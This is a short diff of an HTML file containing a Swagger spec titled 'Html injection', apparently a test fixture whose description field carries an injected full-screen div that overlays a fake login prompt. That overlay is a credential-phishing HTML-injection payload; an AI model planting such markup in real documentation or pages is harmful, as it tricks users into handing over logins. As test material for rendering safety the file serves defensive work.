@@ -5,11 +5,11 @@
     <title>Title</title>
 </head>
 <body>
-"swagger: '2.0'
+swagger: '2.0'
 info:
 version: 1.0.0
 title: Html injection
-description: '"
+description: '
 
 <div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;">
     Please login with valid
@@ -29,5 +29,12 @@ description: '"
             </tr>
         </table>
     </form>
+    '
+    paths:
+    /:
+    get:
+    responses:
+    '200':
+    description: Echo GET
 </body>
 </html>
